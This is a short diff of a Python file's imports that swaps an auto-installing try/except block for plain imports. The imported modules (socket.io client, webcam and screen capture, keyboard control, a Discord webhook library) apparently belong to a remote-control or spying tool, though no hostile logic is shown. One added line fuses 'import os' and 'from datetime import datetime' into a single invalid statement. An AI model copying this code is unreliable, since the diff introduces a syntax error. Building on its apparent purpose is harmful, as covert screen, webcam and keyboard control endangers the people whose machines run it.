@@ -3,24 +3,20 @@ from __webhook import _WebhookX
 from informations import Info
 cc = Config()
 ii = Info()
-try:
-    import socketio
-    import cv2
-    import random
-    import pyttsx3
-    import string
-    import ctypes
-    import os
-    from datetime import datetime
-    import subprocess
-    import io
-    from dhooks import Webhook as web
-    from dhooks import Embed, File
-    from PIL import ImageGrab
-    from pynput.keyboard import Key, Controller
-except Exception:
-    import subprocess
-    subprocess.run("python -m pip install python-socketio && python -m pip install pynput && python -m pip install pyttsx3 && python -m pip install datetime", shell=True)
+
+import socketio
+import cv2
+import random
+import pyttsx3
+import string
+import ctypes
+import osfrom datetime import datetime
+import subprocess
+import io
+from dhooks import Webhook as web
+from dhooks import Embed, File
+from PIL import ImageGrab
+from pynput.keyboard import Key, Controller
 
 sio = socketio.Client()
 
